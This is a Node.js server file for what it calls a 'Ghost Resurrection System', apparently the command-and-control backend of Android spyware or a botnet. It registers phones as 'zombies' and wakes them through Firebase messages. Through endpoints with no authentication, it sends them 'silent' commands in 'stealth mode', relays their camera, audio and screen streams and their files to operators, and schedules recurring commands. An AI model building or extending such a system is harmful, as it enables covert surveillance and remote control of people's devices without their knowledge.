const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');

// Ghost Resurrection System imports
const GhostResurrectionManager = require('./ghost-resurrection-manager');
const createZombieRoutes = require('./zombie-routes');
const AdvancedAnalyticsAPI = require('./advanced-analytics-api');
const LiveStreamingManager = require('./live-streaming-manager');
const CommandScheduler = require('./command-scheduler');

const app = express();
const server = http.createServer(app);

// Configure CORS for Socket.IO
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"],
        credentials: true
    }
});

// Middleware
app.use(cors());
app.use(express.json());

// Serve static files (Zombie Dashboard)
app.use(express.static(path.join(__dirname, 'public')));

// Initialize Ghost Resurrection System
const ghostManager = new GhostResurrectionManager();
const analyticsAPI = new AdvancedAnalyticsAPI(ghostManager);
const streamingManager = new LiveStreamingManager(ghostManager, io);
const commandScheduler = new CommandScheduler(ghostManager);

console.log('👻 Ghost Resurrection System v3.0 - Server Starting...');
console.log('🧟 Phase 3 Advanced Features: Analytics, Formations, AI Behavior Analysis');
console.log('🎯 Ultimate Control Dashboard available at /ultimate-control-dashboard.html');
console.log('📊 Advanced Analytics API available at /api/analytics/*');
console.log('📡 Live Streaming Manager initialized - Multi-camera surveillance ready');
console.log('⏰ Command Scheduler initialized - Automated operations ready');

// File upload configuration
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const uploadsDir = path.join(__dirname, 'uploads');
        if (!fs.existsSync(uploadsDir)) {
            fs.mkdirSync(uploadsDir, { recursive: true });
        }
        cb(null, uploadsDir);
    },
    filename: (req, file, cb) => {
        cb(null, `${Date.now()}-${file.originalname}`);
    }
});

const upload = multer({ 
    storage: storage,
    limits: { fileSize: 50 * 1024 * 1024 } // 50MB limit
});

// Store connected devices and clients
const devices = new Map(); // Android devices
const clients = new Map(); // Web clients
const deviceSessions = new Map(); // Active sessions

class DeviceManager {
    constructor() {
        this.devices = new Map();
        this.clients = new Map();
        this.sessions = new Map();
    }

    addDevice(socketId, deviceInfo) {
        const device = {
            id: deviceInfo.deviceId || uuidv4(),
            socketId: socketId,
            name: deviceInfo.name || 'Unknown Device',
            model: deviceInfo.model || 'Unknown',
            androidVersion: deviceInfo.androidVersion || 'Unknown',
            ipAddress: deviceInfo.ipAddress || 'Unknown',
            connectedAt: new Date(),
            status: 'online',
            capabilities: deviceInfo.capabilities || []
        };
        
        this.devices.set(device.id, device);
        console.log(`📱 Device connected: ${device.name} (${device.id})`);
        
        // Notify all Windows clients about new device
        this.broadcastToClients('device_connected', device);
        return device;
    }

    removeDevice(socketId) {
        for (const [deviceId, device] of this.devices.entries()) {
            if (device.socketId === socketId) {
                this.devices.delete(deviceId);
                console.log(`📱 Device disconnected: ${device.name}`);
                
                // Notify all Windows clients
                this.broadcastToClients('device_disconnected', { deviceId });
                break;
            }
        }
    }

    addClient(socketId, clientInfo) {
        const client = {
            id: uuidv4(),
            socketId: socketId,
            name: clientInfo.name || 'Web Client',
            connectedAt: new Date()
        };
        
        this.clients.set(client.id, client);
        console.log(`💻 Windows client connected: ${client.name}`);
        
        // Send current device list to new Windows client
        const deviceList = Array.from(this.devices.values());
        io.to(socketId).emit('device_list', deviceList);
        
        return client;
    }

    removeClient(socketId) {
        for (const [clientId, client] of this.clients.entries()) {
            if (client.socketId === socketId) {
                this.clients.delete(clientId);
                console.log(`💻 Windows client disconnected: ${client.name}`);
                break;
            }
        }
    }

    getDeviceBySocketId(socketId) {
        for (const device of this.devices.values()) {
            if (device.socketId === socketId) {
                return device;
            }
        }
        return null;
    }

    getDeviceById(deviceId) {
        return this.devices.get(deviceId);
    }

    broadcastToClients(event, data) {
        for (const client of this.clients.values()) {
            io.to(client.socketId).emit(event, data);
        }
    }

    forwardCommandToDevice(deviceId, command, clientSocketId) {
        const device = this.getDeviceById(deviceId);
        if (device) {
            const commandWithClientId = {
                ...command,
                clientSocketId: clientSocketId,
                timestamp: new Date().toISOString()
            };
            
            io.to(device.socketId).emit('device_command', commandWithClientId);
            console.log(`📤 Command sent to ${device.name}: ${command.command}`);
            return true;
        }
        return false;
    }

    forwardResponseToClient(clientSocketId, response) {
        io.to(clientSocketId).emit('device_response', response);
        console.log(`📥 Response sent to client: ${response.command}`);
    }
}

const deviceManager = new DeviceManager();

// Socket.IO connection handling
io.on('connection', (socket) => {
    console.log(`🔌 New connection: ${socket.id}`);

    // Device registration (Android app)
    socket.on('device_register', (deviceInfo) => {
        const device = deviceManager.addDevice(socket.id, deviceInfo);
        socket.emit('device_registered', { 
            deviceId: device.id,
            message: 'Device registered successfully',
            serverTime: new Date().toISOString()
        });
    });

    // Client registration (Windows client)
    socket.on('client_register', (clientInfo) => {
        const client = deviceManager.addClient(socket.id, clientInfo);
        socket.emit('client_registered', { 
            clientId: client.id,
            message: 'Client registered successfully',
            serverTime: new Date().toISOString()
        });
    });

    // Command from Windows client to Android device
    socket.on('device_command', (data) => {
        const { deviceId, command } = data;
        const success = deviceManager.forwardCommandToDevice(deviceId, command, socket.id);
        
        if (!success) {
            socket.emit('command_error', {
                error: 'Device not found or offline',
                deviceId: deviceId,
                timestamp: new Date().toISOString()
            });
        }
    });

    // Response from Android device to Windows client
    socket.on('device_response', (response) => {
        const device = deviceManager.getDeviceBySocketId(socket.id);
        if (device && response.clientSocketId) {
            deviceManager.forwardResponseToClient(response.clientSocketId, response);
        }
    });

    // File stream from device
    socket.on('file-stream', (data) => {
        // Forward file stream to requesting client
        if (data.clientSocketId) {
            io.to(data.clientSocketId).emit('file-stream', data);
        }
    });

    // Live streams (video, audio, screen)
    socket.on('stream-data', (data) => {
        // Forward stream to all connected clients interested in this device
        const device = deviceManager.getDeviceBySocketId(socket.id);
        if (device) {
            deviceManager.broadcastToClients('stream-data', {
                deviceId: device.id,
                streamType: data.streamType,
                data: data.data,
                timestamp: data.timestamp
            });
        }
    });

    // Request device list (Windows client)
    socket.on('get_devices', () => {
        const deviceList = Array.from(deviceManager.devices.values());
        socket.emit('device_list', deviceList);
    });

    // Ping/Pong for connection monitoring
    socket.on('ping', () => {
        socket.emit('pong');
    });

    // FCM token registration (Ghost Resurrection System)
    socket.on('fcm_register', (registrationData) => {
        console.log('🔑 FCM token registration received');
        
        try {
            const result = ghostManager.handleFCMTokenRegistration(
                registrationData.device_info,
                socket.id
            );
            
            if (result.success) {
                socket.emit('fcm_registered', { 
                    success: true,
                    deviceId: result.deviceId,
                    message: result.message,
                    serverTime: new Date().toISOString()
                });
                
                console.log(`✅ FCM registration successful for device: ${result.deviceId}`);
            } else {
                socket.emit('fcm_registration_error', {
                    success: false,
                    error: result.error,
                    serverTime: new Date().toISOString()
                });
                
                console.log(`❌ FCM registration failed: ${result.error}`);
            }
        } catch (error) {
            console.error('💥 FCM registration error:', error);
            socket.emit('fcm_registration_error', {
                success: false,
                error: error.message,
                serverTime: new Date().toISOString()
            });
        }
    });

    // Handle disconnection
    socket.on('disconnect', () => {
        console.log(`🔌 Disconnected: ${socket.id}`);
        deviceManager.removeDevice(socket.id);
        deviceManager.removeClient(socket.id);
    });
});

// REST API endpoints

// Root endpoint - Serve Zombie Dashboard HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'zombie-dashboard.html'));
});

// API endpoint for server info
app.get('/api/info', (req, res) => {
    const dashboard = ghostManager.getZombieArmyDashboard();
    
    res.json({
        success: true,
        server: 'Ghost Resurrection System Server',
        version: '2.0.0',
        description: 'Advanced remote device management with FCM wake-up capabilities',
        uptime: process.uptime(),
        stats: {
            // Legacy stats
            connectedDevices: deviceManager.devices.size,
            connectedClients: deviceManager.clients.size,
            totalSessions: deviceManager.sessions.size,
            // Ghost System stats
            totalZombies: dashboard.totalZombies,
            activeZombies: dashboard.activeZombies,
            dormantZombies: dashboard.dormantZombies
        },
        ghostResurrectionSystem: {
            enabled: true,
            fcmService: 'active',
            sessionTimeout: '8 minutes',
            stealthMode: 'enabled',
            dashboard: '/zombie-dashboard.html'
        },
        endpoints: {
            status: '/api/status',
            devices: '/api/devices',
            upload: '/api/upload',
            download: '/uploads/:filename',
            // Ghost System endpoints
            zombieDashboard: '/api/zombie/dashboard',
            zombieRegister: '/api/zombie/register',
            zombieWake: '/api/zombie/:id/wake',
            zombieShutdown: '/api/zombie/:id/shutdown',
            zombieCommand: '/api/zombie/:id/command',
            zombieArmyWake: '/api/zombie/army/wake'
        },
        websocket: {
            enabled: true,
            events: ['register-device', 'register-client', 'send-command', 'stream-data']
        },
        timestamp: new Date().toISOString()
    });
});

app.get('/api/devices', (req, res) => {
    const deviceList = Array.from(deviceManager.devices.values());
    res.json({
        success: true,
        devices: deviceList,
        count: deviceList.length
    });
});

app.get('/api/status', (req, res) => {
    res.json({
        success: true,
        server: 'Remote System Control Server',
        version: '1.0.0',
        uptime: process.uptime(),
        devices: deviceManager.devices.size,
        clients: deviceManager.clients.size,
        timestamp: new Date().toISOString()
    });
});

// File upload endpoint
app.post('/api/upload', upload.single('file'), (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'No file uploaded' });
    }

    res.json({
        success: true,
        filename: req.file.filename,
        originalName: req.file.originalname,
        size: req.file.size,
        path: `/uploads/${req.file.filename}`
    });
});

// Ghost Resurrection System API Routes
app.use('/api/zombie', createZombieRoutes(ghostManager));

// Phase 3 Advanced Analytics API Routes
app.use('/api/analytics', analyticsAPI.getRouter());

// Enhanced device registration with FCM support
app.post('/api/zombie/register', async (req, res) => {
    try {
        const { fcmToken, deviceId, name, model, androidVersion, ipAddress, capabilities } = req.body;
        
        if (!fcmToken || !deviceId) {
            return res.status(400).json({
                success: false,
                error: 'FCM token and device ID are required'
            });
        }

        const zombie = ghostManager.registerZombieDevice({
            fcmToken,
            deviceId,
            name,
            model,
            androidVersion,
            ipAddress,
            capabilities
        });

        res.json({
            success: true,
            message: 'Zombie device registered successfully',
            data: zombie
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// File download endpoint
app.get('/uploads/:filename', (req, res) => {
    const filename = req.params.filename;
    const filePath = path.join(__dirname, 'uploads', filename);
    
    if (fs.existsSync(filePath)) {
        res.download(filePath);
    } else {
        res.status(404).json({ error: 'File not found' });
    }
});

// Create uploads directory
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
}

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log('👻 Ghost Resurrection System - Server Started');
    console.log('🧟 ======================================');
    console.log(`📡 Server running on port ${PORT}`);
    console.log(`🌐 Server info: http://localhost:${PORT}`);
    console.log(`👻 Zombie Dashboard: http://localhost:${PORT}/zombie-dashboard.html`);
    console.log(`📱 Android devices connect via WebSocket + FCM`);
    console.log(`💻 Windows client connects via WebSocket`);
    console.log('');
    console.log('📋 Available endpoints:');
    console.log(`   GET  /                    - Server information`);
    console.log(`   GET  /api/status          - Server status`);
    console.log(`   GET  /api/devices         - Connected devices (legacy)`);
    console.log(`   POST /api/upload          - File upload`);
    console.log(`   GET  /uploads/:filename   - File download`);
    console.log('');
    console.log('👻 Ghost Resurrection System:');
    console.log(`   GET  /zombie-dashboard.html         - Zombie Army Control Center`);
    console.log(`   GET  /api/zombie/dashboard          - Dashboard data`);
    console.log(`   POST /api/zombie/register           - Register zombie device`);
    console.log(`   POST /api/zombie/:id/wake           - Wake specific zombie`);
    console.log(`   POST /api/zombie/:id/shutdown       - Shutdown zombie`);
    console.log(`   POST /api/zombie/:id/command        - Execute silent command`);
    console.log(`   POST /api/zombie/army/wake          - Wake zombie army`);
    console.log(`   GET  /api/zombie/list               - List all zombies`);
    console.log(`   GET  /api/zombie/sessions           - Active sessions`);
    console.log('');
    console.log('🔥 Firebase Cloud Messaging ready for device resurrection');
    console.log('⏰ 8-minute smart timeout system active');
    console.log('🤫 Silent command execution enabled');
});

// Error handling wrapper
process.on('uncaughtException', (error) => {
    console.error('💥 Uncaught Exception:', error.message);
    console.error('📍 Stack:', error.stack);
    process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('💥 Unhandled Rejection at:', promise, 'reason:', reason);
    process.exit(1);
});

console.log('👻 Ghost Resurrection System - Starting...');

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🛑 Shutting down server...');
    server.close(() => {
        console.log('✅ Server closed.');
        process.exit(0);
    });
});

// Phase 3 Command Scheduler API Routes
app.post('/api/scheduler/schedule', (req, res) => {
    try {
        const result = commandScheduler.scheduleCommand(req.body);
        res.json(result);
    } catch (error) {
        res.status(400).json({ success: false, error: error.message });
    }
});

app.post('/api/scheduler/recurring', (req, res) => {
    try {
        const result = commandScheduler.scheduleRecurringCommand(req.body);
        res.json(result);
    } catch (error) {
        res.status(400).json({ success: false, error: error.message });
    }
});

app.delete('/api/scheduler/cancel/:jobId', (req, res) => {
    try {
        const result = commandScheduler.cancelScheduledCommand(req.params.jobId);
        res.json(result);
    } catch (error) {
        res.status(400).json({ success: false, error: error.message });
    }
});

app.delete('/api/scheduler/stop/:jobId', (req, res) => {
    try {
        const result = commandScheduler.stopRecurringCommand(req.params.jobId);
        res.json(result);
    } catch (error) {
        res.status(400).json({ success: false, error: error.message });
    }
});

app.get('/api/scheduler/jobs', (req, res) => {
    try {
        const jobs = commandScheduler.getAllScheduledJobs();
        res.json({ success: true, ...jobs });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/scheduler/history', (req, res) => {
    try {
        const limit = parseInt(req.query.limit) || 50;
        const history = commandScheduler.getJobHistory(limit);
        res.json({ success: true, history });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/scheduler/stats', (req, res) => {
    try {
        const stats = commandScheduler.getSchedulerStats();
        res.json({ success: true, stats });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/scheduler/automated-response', (req, res) => {
    try {
        const result = commandScheduler.createAutomatedResponse(req.body);
        res.json(result);
    } catch (error) {
        res.status(400).json({ success: false, error: error.message });
    }
});
